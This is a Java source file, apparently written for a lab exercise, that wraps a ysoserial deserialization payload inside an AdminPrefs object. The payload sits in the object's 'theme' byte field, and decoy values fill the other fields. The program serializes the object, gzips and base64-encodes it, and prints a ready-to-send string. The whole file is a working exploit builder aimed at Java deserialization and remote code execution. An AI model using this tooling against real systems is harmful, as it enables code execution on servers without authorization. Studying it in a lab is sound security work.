import java.io.*;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;
import lab.actions.common.serializable.AdminPrefs;

public class AdminPrefsWrapper {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            System.out.println("Usage: java AdminPrefsWrapper <ysoserial-payload-file>");
            return;
        }

        // Read raw ysoserial payload bytes
        byte[] payloadBytes = readBytes(new File(args[0]));

        // Deserialize the ysoserial payload into an actual Object
        //ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payloadBytes));
        //Object payloadObject = ois.readObject();
        //ois.close();

        // Create AdminPrefs and embed the raw payload in favoriteFood
        AdminPrefs prefs = new AdminPrefs();
        prefs.favoriteFood = "no food"; //optionally use deserialized payload - payloadObject
        prefs.favoriteQuote = "This is fine.";
        prefs.favouriteBook = "Totally legit book";
        prefs.theme = payloadBytes;
    printClassDescriptor(AdminPrefs.class);
        // Serialize AdminPrefs object
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(prefs);
        oos.close();

        // Gzip the serialized bytes
        byte[] serialized = baos.toByteArray();
        byte[] gzipped = gzip(serialized);

        // Base64 encode the gzipped payload
        String base64 = Base64.getEncoder().encodeToString(gzipped);

        System.out.println("[+] Final base64+gzipped serialized AdminPrefs:");
        System.out.println(base64);
    }

    private static byte[] readBytes(File file) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int len;
        while ((len = fis.read(buffer)) > 0) {
            baos.write(buffer, 0, len);
        }
        fis.close();
        return baos.toByteArray();
    }

    private static byte[] gzip(byte[] input) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        GZIPOutputStream gzipOut = new GZIPOutputStream(bos);
        gzipOut.write(input);
        gzipOut.close();
        return bos.toByteArray();
    }

    private static void printClassDescriptor(Class<?> clazz) {
    ObjectStreamClass osc = ObjectStreamClass.lookup(clazz);
    System.out.println("---- Class Descriptor ----");
    System.out.println("Class: " + osc.getName());
    System.out.println("serialVersionUID: " + osc.getSerialVersionUID());
    System.out.println("Fields:");
    for (ObjectStreamField field : osc.getFields()) {
        System.out.println("  - " + field.getName() + " (" + field.getType().getName() + ")");
    }
    System.out.println("--------------------------");
}
    

}
